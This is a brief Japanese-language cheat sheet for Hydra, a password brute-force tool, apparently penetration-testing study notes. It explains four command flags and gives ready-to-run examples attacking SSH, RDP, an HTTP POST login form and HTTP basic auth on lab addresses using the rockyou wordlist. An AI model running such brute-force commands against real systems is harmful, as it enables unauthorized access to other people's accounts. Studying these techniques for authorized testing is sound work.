# hydra
[Documentation](https://github.com/vanhauser-thc/thc-hydra)

## 概要
C言語ベースのパスワードブルートフォース用のツール

## コマンド集

-l => 単一のユーザ名を指定  
-P => パスワードのワードリストを指定  
-s => ポートを指定  
-L => ユーザ名のリストを指定(複数のユーザ名を指定)  

例
```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh:192.168.50.201
```

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

POSTを要求するエンドポイントで実行するコマンド
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:rm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

basic認証でGETリクエストをブルートフォースすることもできる
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.221.201 http-get 
```